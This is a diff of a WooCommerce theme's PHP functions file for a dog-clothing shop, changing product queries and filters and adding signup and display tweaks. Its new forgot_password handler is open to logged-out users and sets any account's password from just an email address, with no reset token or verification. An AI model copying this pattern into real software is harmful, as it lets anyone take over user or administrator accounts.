@@ -111,6 +111,7 @@ function load_home_products() {
         $get_variations = count( $product_obj->get_children() ) <= apply_filters( 'woocommerce_ajax_variation_threshold', 30, $product_obj );
         $available_variations = $get_variations ? $product_obj->get_available_variations() : false;
         $attributes = $product_obj->get_variation_attributes();
+        ksort($attributes);
         $selected_attributes = $product_obj->get_default_attributes();
 
 
@@ -122,7 +123,7 @@ function load_home_products() {
         ?>
         <div class="product-list-col" data-product-variants="<?php echo $variations_attr;?>" data-product-initial-price="<?php echo function_exists( 'wc_esc_json' ) ? wc_esc_json( $product_obj->get_price_html() ) : _wp_specialchars( $product_obj->get_price_html(), ENT_QUOTES, 'UTF-8', true )?>">
             <div class="product-list-col-wrap">
-                <div class="product-list-col-img-wrap" style="background-image:url(<?php echo wp_get_attachment_url( get_post_thumbnail_id($product->ID), 'full' );?>)"></div>
+                <a href="<?php echo get_permalink($product->ID)?>"><div class="product-list-col-img-wrap" style="background-image:url(<?php echo wp_get_attachment_url( get_post_thumbnail_id($product->ID), 'full' );?>)"></div></a>
                 <a class="text-link" href="<?php echo get_permalink($product->ID)?>"><h6 class="product-list-col-title"><?php echo get_the_title($product->ID)?></h6></a>
                 <p class="product-list-col-price"><?php echo $product_obj->get_price_html();?></p>
                 <p class="product-list-col-desc">
@@ -184,47 +185,28 @@ function load_shop_products() {
 		$terms = array('doglovers_clothing');
 	}
 
-    if(isset($_POST['cat']) && $_POST['cat'] == 'all') {
-        $products = array_merge(
-            get_posts(array(
-                'post_type'             => 'product',
-                // 'orderby' => 'rand',
-                'numberposts' => -1,
-                'posts_per_page' => -1,
-                'orderby'        => 'meta_value_num',
-                'order'          => $order,
-                'meta_key'       => '_price',
-                'tax_query'             => array(
-                    array(
-                        'taxonomy'      => 'product_cat',
-                        'field'         => 'slug',
-                        'terms'         => array('dog_clothing', 'dog_accessories'),
-                        'operator'      => 'IN'
-                    ),
-                )
-            )),
-            get_posts(array(
-                'post_type'             => 'product',
-                // 'orderby' => 'rand',
-                'numberposts' => -1,
-                'posts_per_page' => -1,
-                'orderby'        => 'meta_value_num',
-                'order'          => $order,
-                'meta_key'       => '_price',
-                'tax_query'             => array(
-                    array(
-                        'taxonomy'      => 'product_cat',
-                        'field'         => 'slug',
-                        'terms'         => array('doglovers_clothing'),
-                        'operator'      => 'IN'
-                    ),
-                )
-            ))
-        );
-	}
-
     if(isset($_POST['sort']) && $_POST['sort'] == 'desc') {
 		$order = 'DESC';
+	}
+
+    if(isset($_POST['cat']) && $_POST['cat'] == 'all') {
+        $products = get_posts(array(
+            'post_type'             => 'product',
+            // 'orderby' => 'rand',
+            'numberposts' => -1,
+            'posts_per_page' => -1,
+            'orderby'        => 'meta_value_num',
+            'order'          => $order,
+            'meta_key'       => '_price',
+            'tax_query'             => array(
+                array(
+                    'taxonomy'      => 'product_cat',
+                    'field'         => 'slug',
+                    'terms'         => array('dog_clothing', 'dog_accessories', 'doglovers_clothing'),
+                    'operator'      => 'IN'
+                ),
+            )
+        ));
 	}
 
     if($products == null) {
@@ -254,6 +236,7 @@ function load_shop_products() {
         $get_variations = count( $product_obj->get_children() ) <= apply_filters( 'woocommerce_ajax_variation_threshold', 30, $product_obj );
         $available_variations = $get_variations ? $product_obj->get_available_variations() : false;
         $attributes = $product_obj->get_variation_attributes();
+        ksort($attributes);
         $selected_attributes = $product_obj->get_default_attributes();
 
 
@@ -265,7 +248,7 @@ function load_shop_products() {
         ?>
         <div class="product-list-col" data-product-variants="<?php echo $variations_attr;?>" data-product-initial-price="<?php echo function_exists( 'wc_esc_json' ) ? wc_esc_json( $product_obj->get_price_html() ) : _wp_specialchars( $product_obj->get_price_html(), ENT_QUOTES, 'UTF-8', true )?>">
             <div class="product-list-col-wrap">
-                <div class="product-list-col-img-wrap" style="background-image:url(<?php echo wp_get_attachment_url( get_post_thumbnail_id($product->ID), 'full' );?>)"></div>
+                <a href="<?php echo get_permalink($product->ID)?>"><div class="product-list-col-img-wrap" style="background-image:url(<?php echo wp_get_attachment_url( get_post_thumbnail_id($product->ID), 'full' );?>)"></div></a>
                 <a class="text-link" href="<?php echo get_permalink($product->ID)?>"><h6 class="product-list-col-title"><?php echo get_the_title($product->ID)?></h6></a>
                 <p class="product-list-col-price"><?php echo $product_obj->get_price_html();?></p>
                 <div class="product-list-detail-variants-row">
@@ -324,52 +307,125 @@ add_action("wp_ajax_nopriv_add_to_cart", "add_to_cart");
 
 function load_directories() {
 
-	$terms = array('directory');
     $order = 'ASC';
 
+    $tax_query_cat = null;
 	if(isset($_POST['cat'])) {
-		$terms = $_POST['cat'];
+        $tax_query_cat = array(
+            'taxonomy'      => 'product_cat',
+            'field'         => 'slug',
+            'terms'         => $_POST['cat'],
+            'operator'      => 'IN'
+		);
 	}
 
+    $tax_query_color = null;
+    if(isset($_POST['color']) && $_POST['color'] != '') {
+        $tax_query_color = array(
+            'taxonomy'      => 'pa_color',
+            'field'         => 'slug',
+            'terms'         => $_POST['color'],
+            'operator'      => 'IN'
+        );
+	}
 
     if(isset($_POST['sort']) && $_POST['sort'] == 'desc') {
 		$order = 'DESC';
 	}
 
-	$products = get_posts(array(
-		'post_type'             => 'product',
-		// 'orderby' => 'rand',
-        'numberposts' => -1,
-        'posts_per_page' => -1,
-        'orderby'        => 'meta_value_num',
-        'order'          => $order,
-        'meta_key'       => '_price',
-		'tax_query'             => array(
+    $meta_query = [];
+    if(isset($_POST['brand']) && $_POST['brand'] != '') {
+		$meta_query =  array(
 			array(
-				'taxonomy'      => 'product_cat',
-				'field'         => 'slug',
-				'terms'         => $terms,
-				'operator'      => 'IN'
+				'key'      => 'brand',
+				'value'    => array($_POST['brand']),
+                'compare'  => 'IN'
 			),
-		)
-	));
+		);
+	}
+    
+    if($tax_query_cat && $tax_query_color) {
+        $products = get_posts(array(
+            'post_type'             => 'product',
+            // 'orderby' => 'rand',
+            'numberposts' => -1,
+            'posts_per_page' => -1,
+            'orderby'        => 'meta_value_num',
+            'order'          => $order,
+            'meta_key'       => 'price',
+            'tax_query'      => array(
+                'relation' => 'AND',
+                $tax_query_cat,
+                $tax_query_color
+            ),
+            'meta_query'    => $meta_query
+        ));
+    }
+    else if($tax_query_cat) {
+        $products = get_posts(array(
+            'post_type'             => 'product',
+            // 'orderby' => 'rand',
+            'numberposts' => -1,
+            'posts_per_page' => -1,
+            'orderby'        => 'meta_value_num',
+            'order'          => $order,
+            'meta_key'       => 'price',
+            'tax_query'      => array(
+                $tax_query_cat,
+            ),
+            'meta_query'    => $meta_query
+        ));
+    }
+    else if($tax_query_color) {
+        $products = get_posts(array(
+            'post_type'             => 'product',
+            // 'orderby' => 'rand',
+            'numberposts' => -1,
+            'posts_per_page' => -1,
+            'orderby'        => 'meta_value_num',
+            'order'          => $order,
+            'meta_key'       => 'price',
+            'tax_query'      => array(
+                $tax_query_color
+            ),
+            'meta_query'    => $meta_query
+        ));
+    }
+    else {
+        $products = get_posts(array(
+            'post_type'             => 'product',
+            // 'orderby' => 'rand',
+            'numberposts' => -1,
+            'posts_per_page' => -1,
+            'orderby'        => 'meta_value_num',
+            'order'          => $order,
+            'meta_key'       => 'price',
+            'meta_query'    => $meta_query
+        ));
+    }
+	
 	ob_start();
 	foreach($products as $product) {
+        $product_obj = wc_get_product($product);
+        if(!$product_obj->is_type('external')) {
+            continue;
+        }
         ?>
         <div class="directory-list-col">
             <div class="directory-list-col-wrap">
                 <div class="directory-list-col-img-wrap" style="background-image:url(<?php echo wp_get_attachment_url( get_post_thumbnail_id($product->ID), 'full' );?>)"></div>
-                <h6 class="directory-list-col-title"><?php echo get_the_title($product->ID)?></h6>
-                <p class="directory-list-col-brand"><?php echo get_field('brand', $product->ID)?></p>
-                <p class="directory-list-col-price"><?php echo get_field('price', $product->ID)?></p>
-                <a class="text-link" href="<?php echo get_field('product_link', $product->ID)?>">
-                <?php 
-                    $url = get_field('product_link', $product->ID);
-                    $urlParts = parse_url($url);
-                    $url = preg_replace('/^www\./', '', $urlParts['host']);
-                    echo $url;
-                ?>
-                </a>
+                    <h6 class="directory-list-col-title"><?php echo get_the_title($product->ID)?></h6>
+                    <p class="directory-list-col-brand"><?php echo get_field('brand', $product->ID)?></p>
+                    <p class="directory-list-col-price"><?php echo $product_obj->get_regular_price()?></p>
+                    <a class="text-link" href="<?php echo $product_obj->get_product_url()?>">
+                    <?php 
+                        $url = $product_obj->get_product_url();
+                        $urlParts = parse_url($url);
+                        $url = preg_replace('/^www\./', '', $urlParts['host']);
+                        echo $url;
+                    ?>
+                    </a>
+                </div>
             </div>
         </div>
         <?php
@@ -427,6 +483,7 @@ function signup() {
         ));
     } else {
         update_user_meta($user_id, 'join', $_POST['join'] == 'true' ? "1" : "0");
+        update_user_meta($user_id, 'hear', isset($_POST['hear']) ? $_POST['hear'] : "");
 
         if($_POST['join'] == 'true') {
             $response = subscribeKlaviyo($_POST['email']);
@@ -443,6 +500,39 @@ function signup() {
 
 add_action("wp_ajax_signup", "signup");
 add_action("wp_ajax_nopriv_signup", "signup");
+
+function forgot_password() {
+    $email = isset($_POST['email']) ? $_POST['email'] : '';
+    $password = isset($_POST['password']) ? $_POST['password'] : '';
+    $user = get_user_by('email', $email);
+    if($user) {
+
+        if($password !='') {
+            wp_set_password( $password, $user->id );
+
+            echo json_encode(array(
+                'success' => true,
+                'message' => $user->id
+            ));
+        }
+        else {
+            echo json_encode(array(
+                'success' => false,
+                'message' => 'password empty'
+            ));    
+        }
+    }
+    else {
+        echo json_encode(array(
+            'success' => false,
+            'message' => 'email wrong'
+        ));
+    }
+	die();
+}
+
+add_action("wp_ajax_forgot_password", "forgot_password");
+add_action("wp_ajax_nopriv_forgot_password", "forgot_password");
 
 function subscribeKlaviyo($email) {
     $klaviyo_list = 'SKD4Zf';
@@ -504,4 +594,26 @@ function subscribe_newsletter() {
 
 add_action("wp_ajax_subscribe_newsletter", "subscribe_newsletter");
 add_action("wp_ajax_nopriv_subscribe_newsletter", "subscribe_newsletter");
+
+add_filter( 'woocommerce_dropdown_variation_attribute_options_args', 'dudley_filter_dropdown_args', 10 );
+
+function dudley_filter_dropdown_args( $args ) {
+    $var_tax = get_taxonomy( $args['attribute'] );
+    $args['show_option_none'] = 'Choose '.$var_tax->labels->name;
+    global $product;
+    $args['show_option_none'] = 'Choose a '.strtolower(wc_attribute_label($args['attribute'],$product));
+    return $args;
+}
+
+add_filter( 'woocommerce_quantity_input_args', 'dudley_filter_quantity_input_args', 10, 2 ); // Simple products
+
+function dudley_filter_quantity_input_args( $args, $product ) {
+	if ( is_singular( 'product' ) ) {
+		$args['input_value'] 	= 1;	// Starting value (we only want to affect product pages, not cart)
+	}
+	// $args['max_value'] 	= 1; 	// Maximum value
+	// $args['min_value'] 	= 1;   	// Minimum value
+	$args['step'] 		= 1;    // Quantity steps
+	return $args;
+}
 ?>
